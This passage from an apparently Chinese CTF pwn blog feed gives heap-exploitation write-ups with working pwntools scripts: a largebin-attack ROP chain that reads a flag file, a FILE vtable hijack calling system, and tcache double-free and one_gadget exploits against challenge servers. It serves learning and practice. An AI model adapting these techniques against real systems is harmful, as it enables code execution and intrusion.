class="number">0x000000000012bda6</span></span><br><span class="line">  pop_rax = libc + <span class="number">0x0000000000047cf8</span></span><br><span class="line">  syscall = libc + <span class="number">0xcf6c5</span></span><br><span class="line"></span><br><span class="line">  magic( p64(add_rsp48)) <span class="comment">#malloc -&gt; mnalloc_hook</span></span><br><span class="line">  gdb.attach(r) </span><br><span class="line"></span><br><span class="line">  name(<span class="number">0</span>,p64(pop_rdi) + p64(heap + <span class="number">0x24d0</span>) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">2</span>) + p64(syscall) +</span><br><span class="line">      p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(pop_rax) + p64(<span class="number">0</span>) + p64(syscall) +</span><br><span class="line">      p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(pop_rax) + p64(<span class="number">1</span>) + p64(syscall)</span><br><span class="line">      ) </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>calloc之后有一个地方会跳转到malloc_hook的地方</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f05b5182a28</span> &lt;calloc+<span class="number">40</span>&gt;     mov    rax, qword ptr [rip + <span class="number">0x14a4c1</span>]</span><br><span class="line">  <span class="number">0x7f05b5182a2f</span> &lt;calloc+<span class="number">47</span>&gt;     mov    rax, qword ptr [rax]</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RAX  <span class="number">0x7f05b52cdc30</span> (__malloc_hook) —▸ <span class="number">0x7f05b5175fd6</span> (_IO_vtable_check+<span class="number">118</span>) ◂— add    rsp, <span class="number">0x48</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7f05b5182a32</span> &lt;calloc+<span class="number">50</span>&gt;     test   rax, rax</span><br><span class="line"><span class="number">0x7f05b5182a35</span> &lt;calloc+<span class="number">53</span>&gt;     jne    calloc+<span class="number">720</span> &lt;<span class="number">0x7f05b5182cd0</span>&gt;</span><br></pre></td></tr></table></figure><p>此时stack的内容是</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp   <span class="number">0x7ffc152a6c48</span> —▸ <span class="number">0x7f1389569cda</span> (calloc+<span class="number">730</span>) ◂— test   rax, rax</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ r8<span class="number">-1</span>  <span class="number">0x7ffc152a6c50</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│       <span class="number">0x7ffc152a6c58</span> —▸ <span class="number">0x7ffc152a70a0</span> —▸ <span class="number">0x7ffc152a70c0</span> —▸ <span class="number">0x560a78448f60</span> ◂— push   r15</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│       <span class="number">0x7ffc152a6c60</span> —▸ <span class="number">0x560a78448150</span> ◂— xor    ebp, ebp</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│       <span class="number">0x7ffc152a6c68</span> —▸ <span class="number">0x7ffc152a71a0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│       <span class="number">0x7ffc152a6c70</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│       <span class="number">0x7ffc152a6c78</span> —▸ <span class="number">0x560a784483a1</span> ◂— mov    rcx, rax</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│       <span class="number">0x7ffc152a6c80</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│       <span class="number">0x7ffc152a6c88</span> ◂— <span class="number">0xc800000000</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│       <span class="number">0x7ffc152a6c90</span> —▸ <span class="number">0x7f13894f6542</span> (init_cacheinfo+<span class="number">242</span>) ◂— pop    rdi</span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│       <span class="number">0x7ffc152a6c98</span> —▸ <span class="number">0x560a7a2674d0</span> ◂— <span class="string">'./flag.txt'</span>   <span class="comment">#这里开始就是rop</span></span><br><span class="line"><span class="number">0</span>b:<span class="number">0058</span>│       <span class="number">0x7ffc152a6ca0</span> —▸ <span class="number">0x7f13894f6f9e</span> (strip+<span class="number">190</span>) ◂— pop    rsi</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│       <span class="number">0x7ffc152a6ca8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│       <span class="number">0x7ffc152a6cb0</span> —▸ <span class="number">0x7f1389517cf8</span> (mblen+<span class="number">104</span>) ◂— pop    rax</span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│       <span class="number">0x7ffc152a6cb8</span> ◂— <span class="number">0x2</span></span><br><span class="line"><span class="number">0</span>f:<span class="number">0078</span>│       <span class="number">0x7ffc152a6cc0</span> —▸ <span class="number">0x7f138959f6c5</span> (__time_syscall+<span class="number">5</span>) ◂— syscall </span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│       <span class="number">0x7ffc152a6cc8</span> —▸ <span class="number">0x7f13894f6542</span> (init_cacheinfo+<span class="number">242</span>) ◂— pop    rdi</span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│       <span class="number">0x7ffc152a6cd0</span> ◂— <span class="number">0x3</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│       <span class="number">0x7ffc152a6cd8</span> —▸ <span class="number">0x7f13894f6f9e</span> (strip+<span class="number">190</span>) ◂— pop    rsi</span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│       <span class="number">0x7ffc152a6ce0</span> —▸ <span class="number">0x560a7a265000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│       <span class="number">0x7ffc152a6ce8</span> —▸ <span class="number">0x7f13895fbda6</span> (__lll_lock_wait_private+<span class="number">38</span>) ◂— pop    rdx</span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│       <span class="number">0x7ffc152a6cf0</span> ◂— <span class="number">0x100</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00</span>b0│       <span class="number">0x7ffc152a6cf8</span> —▸ <span class="number">0x7f1389517cf8</span> (mblen+<span class="number">104</span>) ◂— pop    rax</span><br><span class="line"><span class="number">17</span>:<span class="number">00</span>b8│       <span class="number">0x7ffc152a6d00</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">18</span>:<span class="number">00</span>c0│       <span class="number">0x7ffc152a6d08</span> —▸ <span class="number">0x7f138959f6c5</span> (__time_syscall+<span class="number">5</span>) ◂— syscall </span><br><span class="line"><span class="number">19</span>:<span class="number">00</span>c8│       <span class="number">0x7ffc152a6d10</span> —▸ <span class="number">0x7f13894f6542</span> (init_cacheinfo+<span class="number">242</span>) ◂— pop    rdi</span><br><span class="line"><span class="number">1</span>a:<span class="number">00</span>d0│       <span class="number">0x7ffc152a6d18</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">1</span>b:<span class="number">00</span>d8│       <span class="number">0x7ffc152a6d20</span> —▸ <span class="number">0x7f13894f6f9e</span> (strip+<span class="number">190</span>) ◂— pop    rsi</span><br><span class="line"><span class="number">1</span>c:<span class="number">00e0</span>│       <span class="number">0x7ffc152a6d28</span> —▸ <span class="number">0x560a7a265000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1</span>d:<span class="number">00e8</span>│       <span class="number">0x7ffc152a6d30</span> —▸ <span class="number">0x7f13895fbda6</span> (__lll_lock_wait_private+<span class="number">38</span>) ◂— pop    rdx</span><br><span class="line"><span class="number">1</span>e:<span class="number">00</span>f0│       <span class="number">0x7ffc152a6d38</span> ◂— <span class="number">0x100</span></span><br><span class="line"><span class="number">1</span>f:<span class="number">00</span>f8│       <span class="number">0x7ffc152a6d40</span> —▸ <span class="number">0x7f1389517cf8</span> (mblen+<span class="number">104</span>) ◂— pop    rax</span><br><span class="line"><span class="number">20</span>:<span class="number">0100</span>│       <span class="number">0x7ffc152a6d48</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">21</span>:<span class="number">0108</span>│       <span class="number">0x7ffc152a6d50</span> —▸ <span class="number">0x7f138959f6c5</span> (__time_syscall+<span class="number">5</span>) ◂— syscall </span><br><span class="line"><span class="number">22</span>:<span class="number">0110</span>│       <span class="number">0x7ffc152a6d58</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="meta">... </span>↓</span><br></pre></td></tr></table></figure><p>所以malloc就要用到rsp+0x48的位置<br>然后就会执行rop链getshell</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;和glibc2.23版本相比，2.29的版本对unsorted bin的检查多了很多，导致unsorted bin attack几乎不可行，所以我们用largebin attack作为它的替代&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="pwm知识点" scheme="https://c0yo7e.github.io/tags/pwm%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>BUU刷题集</title>
    <link href="https://c0yo7e.github.io/2020/08/02/BUU%E5%88%B7%E9%A2%98%E9%9B%86/"/>
    <id>https://c0yo7e.github.io/2020/08/02/BUU刷题集/</id>
    <published>2020-08-02T01:02:00.000Z</published>
    <updated>2020-08-03T14:51:30.017Z</updated>
    
    <content type="html"><![CDATA[<p>之前一直有说要刷buu，但一直没怎么行动，今天开始，要好好刷题了!<br>这篇blog将持续不定时更新（如果能日更就好了）<br>啊宁！冲呀！</p><a id="more"></a><h3 id="mrctf2020-spfa"><a href="#mrctf2020-spfa" class="headerlink" title="mrctf2020-spfa"></a>mrctf2020-spfa</h3><p>这题其实刚开始看到我就觉得是算法题（曾经被最短路径折磨得不清啊</p><p>仔细看代码，发现程序有一个判断，两节点之间的路径&gt;=两节点通过第三结点连接的路径的话就会给两节点附上两路径之和。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( s[v7] &gt;= s[v6] + len[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        s[v7] = len[i] + s[v6];</span><br><span class="line">        <span class="keyword">if</span> ( !v9[v7] )</span><br><span class="line">        &#123;</span><br><span class="line">          v9[v7] = <span class="number">1</span>;</span><br><span class="line">          qu[v4++] = v7;</span><br><span class="line">          <span class="keyword">if</span> ( v4 &gt; <span class="number">1000</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"queue overflow error!"</span>);</span><br><span class="line">            <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v10;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>如果路径长度都为0，则可陷入循环，直至qu[1000]，而这个位置刚好是flag的位置，所以覆写-1为0，就可以绕过代码，直接getshell</p><h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./mrctf2020_spfa")</span></span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26483</span>)</span><br><span class="line">    </span><br><span class="line">p.sendlineafter(<span class="string">":\n"</span>, <span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">":\n"</span>, <span class="string">'1'</span> + <span class="string">" "</span> + <span class="string">'2'</span> + <span class="string">" "</span> + <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">":\n"</span>, <span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">":\n"</span>, <span class="string">'2'</span> + <span class="string">" "</span> + <span class="string">'1'</span> + <span class="string">" "</span> + <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">":\n"</span>, <span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">":\n"</span>, <span class="string">'1'</span> + <span class="string">" "</span> + <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">":\n"</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwnable-seethefile"><a href="#pwnable-seethefile" class="headerlink" title="pwnable_seethefile"></a>pwnable_seethefile</h3><p>open文件对文件的操作的pwn题我第一次见（一看就是刷题太少），感觉蛮有趣的，然后只好看大佬的wp，发现又是IO_FILE的利用，好像还是属于栈溢出</p><p>由于可以直接读文件，利用linux的proc伪文件系统读取<code>/proc/self/maps</code>即可获得libc基址（可能要两遍，主要是看.so的吧）<br>然后要伪造IO_FILE劫持vtable，使调用fclose的时候调用伪造的结构体</p><p>关于fclose的调用过程：<a href="https://www.jianshu.com/p/0176ebe02354" target="_blank" rel="noopener">https://www.jianshu.com/p/0176ebe02354</a></p><p>在检查<code>vtable_offset==0</code>之后函数对<code>fp-&gt;_flags</code>的<code>_IO_IS_FILEBUF</code>位进行检查，<code>_IO_IS_FILEBUF</code>如上文定义如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_IS_FILEBUF 0x2000</span><br></pre></td></tr></table></figure><p>若该位不为0则调用_IO_un_link(fp)将fp指向的FILE结构体从_IO_list_all的单向链表中取下，并调用_IO_file_close_it(fp)关闭fp。<br>然后将调用_IO_FINISH(fp)，相当于执行((struct IO_FILE_plus *)fp-&gt;vtable)-&gt;__finish(fp)</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">myelf  = ELF(<span class="string">"./seethefile"</span>)</span><br><span class="line">libc   = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">io     = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10200</span>)</span><br><span class="line"></span><br><span class="line">sla          = <span class="keyword">lambda</span> delim,data       :io.sendlineafter(delim, data) </span><br><span class="line">openfile     = <span class="keyword">lambda</span> name :  (sla(<span class="string">"choice :"</span>,<span class="string">"1"</span>),sla(<span class="string">"see :"</span>,name))</span><br><span class="line">readfile     = <span class="keyword">lambda</span>      :  (sla(<span class="string">"choice :"</span>,<span class="string">"2"</span>))</span><br><span class="line">showfile     = <span class="keyword">lambda</span>      :  (sla(<span class="string">"choice :"</span>,<span class="string">"3"</span>))</span><br><span class="line">leave        = <span class="keyword">lambda</span> name :  (sla(<span class="string">"choice :"</span>,<span class="string">"5"</span>),sla(<span class="string">"ame :"</span>,name))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">openfile(<span class="string">"/proc/self/maps"</span>)</span><br><span class="line">readfile()</span><br><span class="line">showfile()</span><br><span class="line">io.recvuntil(<span class="string">"[heap]\n"</span>)</span><br><span class="line">libc_addr = int(io.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x1000</span></span><br><span class="line">system_addr = libc_addr +libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># make fake file</span></span><br><span class="line">fakeFILE = <span class="number">0x0804B284</span></span><br><span class="line">payload  = <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">payload += p32(fakeFILE)</span><br><span class="line">payload += p32(<span class="number">0xffffdfff</span>)</span><br><span class="line">payload += <span class="string">";$0"</span>+<span class="string">'\x00'</span>*<span class="number">0x8d</span></span><br><span class="line">payload += p32(fakeFILE+<span class="number">0x98</span>)</span><br><span class="line">payload += p32(system_addr)*<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">leave(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/04/03/file/" target="_blank" rel="noopener">https://xuanxuanblingbling.github.io/ctf/pwn/2020/04/03/file/</a></p><h4 id="关于fclose的调用过程"><a href="#关于fclose的调用过程" class="headerlink" title="关于fclose的调用过程"></a>关于fclose的调用过程</h4><p><a href="https://www.jianshu.com/p/0176ebe02354" target="_blank" rel="noopener">https://www.jianshu.com/p/0176ebe02354</a></p><h3 id="V-amp-N2020-公开赛-easyTHeap"><a href="#V-amp-N2020-公开赛-easyTHeap" class="headerlink" title="[V&amp;N2020 公开赛]easyTHeap"></a>[V&amp;N2020 公开赛]easyTHeap</h3><p>这个是个最简单的tcache+double free<br>glibc2.27增加了简单tcache这个机制<br>就是先放进tcache的队列里，通过double free来使它进入unsorted bin队列来leak</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"> </span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">p=process(<span class="string">'./easyTHeap'</span>)</span><br><span class="line"><span class="comment"># p = remote('node3.buuoj.cn',26148)</span></span><br><span class="line">elf = ELF(<span class="string">'./easyTHeap'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"size?"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"idx?"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"idx?"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"idx?"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># add(0x80)</span></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x260</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#4 target</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> hex(__malloc_hook)</span><br><span class="line">realloc_hook=libc.sym[<span class="string">'__realloc_hook'</span>]+libc_base</span><br><span class="line">realloc = libc.symbols[<span class="string">'realloc'</span>]+libc_base</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x2000000000000</span>)+p64(<span class="number">0</span>)*<span class="number">20</span>+p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># payload += p64(__malloc_hook)</span></span><br><span class="line">payload += p64(realloc_hook)</span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x10a38c</span></span><br><span class="line"><span class="comment"># 0x4f2c5, 0x4f322, 0x10a38c</span></span><br><span class="line"></span><br><span class="line">payload = p64(one_gadget)+p64(realloc+<span class="number">4</span>) <span class="comment">#rsp+0x70 == null(0x0)</span></span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line">debug(<span class="number">0x0b6f</span>)</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="新增知识点："><a href="#新增知识点：" class="headerlink" title="新增知识点："></a>新增知识点：</h4><p>通过这题是终于知道了onegadget那些个rsp+0x30=0或者null是什么了<br>就是在调用malloc之后，call sytem那个位置，看stack里面，是否满足rsp + 0x30(或者其他）和onegadget里面的条件一致，一致的话这个gadget就可行，不然就要再调用realloc，增加偏移，使他满足（跟进realloc里面看，找到realloc + xxx 的位置为0，即可）</p><h3 id="V-amp-N2020-公开赛-simpleheap"><a href="#V-amp-N2020-公开赛-simpleheap" class="headerlink" title="[V&amp;N2020 公开赛]simpleheap"></a>[V&amp;N2020 公开赛]simpleheap</h3><p>off by one的一道题</p><p>利用off by one可以改chunk size，构造overlap，free掉再add来leak libc，再free掉被重叠的一个堆块，然后再用另一个idx改fd为目标地址（即main_arena-0x23）再add两次就可以达到修改malloc为onegadget的目的了。</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span 